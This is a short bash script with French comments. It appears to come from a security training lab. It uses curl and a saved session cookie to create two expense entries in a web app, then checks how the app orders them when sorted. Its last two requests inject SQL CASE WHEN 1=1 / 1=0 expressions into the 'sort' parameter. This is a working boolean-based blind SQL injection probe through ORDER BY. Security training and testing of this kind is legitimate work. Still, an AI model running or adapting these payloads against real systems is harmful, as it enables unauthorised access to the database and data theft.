#!/bin/bash
A="http://xebec.cylabacademy.net:17222"
echo "=== ajout de depenses ==="
curl -s -m 20 -b /tmp/j752.txt -o /dev/null -w "1: %{http_code}\n" -X POST \
  -d "description=AAA&amount=11&date=2024-01-01" "$A/expenses"
curl -s -m 20 -b /tmp/j752.txt -o /dev/null -w "2: %{http_code}\n" -X POST \
  -d "description=BBB&amount=99&date=2024-06-06" "$A/expenses"
echo
echo "=== ordre par defaut ==="
curl -s -m 20 -b /tmp/j752.txt "$A/expenses?sort=amount" | grep -oE "<td>(AAA|BBB)</td>|<td>[0-9.]+</td>|<td>[0-9]{4}-[0-9]{2}-[0-9]{2}</td>" | head -8
echo "=== ordre par date ==="
curl -s -m 20 -b /tmp/j752.txt "$A/expenses?sort=date" | grep -oE "<td>(AAA|BBB)</td>" | head -4
echo "=== injection : CASE toujours vrai (amount) ==="
curl -s -m 20 -b /tmp/j752.txt --get --data-urlencode "sort=(CASE WHEN 1=1 THEN amount ELSE date END)" "$A/expenses" | grep -oE "<td>(AAA|BBB)</td>" | head -4
echo "=== injection : CASE toujours faux (date) ==="
curl -s -m 20 -b /tmp/j752.txt --get --data-urlencode "sort=(CASE WHEN 1=0 THEN amount ELSE date END)" "$A/expenses" | grep -oE "<td>(AAA|BBB)</td>" | head -4
